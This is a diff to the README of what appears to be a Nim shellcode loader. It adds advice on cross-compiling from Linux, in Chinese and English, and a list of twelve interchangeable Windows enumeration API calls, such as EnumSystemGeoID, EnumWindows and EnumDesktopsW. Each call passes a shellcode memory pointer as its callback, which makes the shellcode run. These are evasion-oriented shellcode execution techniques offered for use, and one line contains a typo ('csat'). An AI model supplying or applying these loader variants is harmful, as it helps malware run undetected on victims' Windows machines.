@@ -58,6 +58,23 @@ step2: generate exe   生成exe
 ```
 nim c --cpu:i386 -d:mingw -d:ssl --opt:size shellcode_loader.nim
 ```
+#Advise 建议
+windows上编译容易出现玄学问题 可以用debian11交叉编译 不过记得要装gcc
+It's easy to have problem if you compile it on Windows Platform.In my opion,you'd better compile it on Linux
 
-
-
+## 源码中的EnumSystemGeoID回调函数可以换成以下函数 等价
+```
+# Callback execution
+    EnumSystemGeoID(GEOCLASS_NATION,0,cast[GEO_ENUMPROC](rPtr)) #①
+    EnumChildWindows(cast[HWND](nil),cast[WNDENUMPROC](rPtr),cast[LPARAM](nil))#②
+    EnumDateFormatsA(cast[DATEFMT_ENUMPROCA](rPtr) , LOCALE_SYSTEM_DEFAULT, cast[DWORD](0))#③
+    EnumDesktopsW(GetProcessWindowStation(),cast[DESKTOPENUMPROCW](rPtr), cast[LPARAM](nil))#④
+    EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()),cast[WNDENUMPROC](rPtr), cast[LPARAM](nil))#⑤
+    EnumSystemCodePagesA(cast[CODEPAGE_ENUMPROCA](rPtr) ,0)#⑥
+    EnumSystemCodePagesW(cast[CODEPAGE_ENUMPROCW](rPtr), CP_INSTALLED)#⑦
+    EnumSystemLanguageGroupsA(cast[LANGUAGEGROUP_ENUMPROCA](rPtr),LGRPID_SUPPORTED,0)#⑧
+    EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](rPtr) ,nil)#⑨
+    EnumThreadWindows(0,csat[WNDENUMPROC](rPtr),0) #⑩
+    EnumUILanguagesA(cast[UILANGUAGE_ENUMPROCA](rPtr), MUI_LANGUAGE_ID, 0)#11
+    EnumWindows(cast[WNDENUMPROC](rPtr), nil)#12
+```
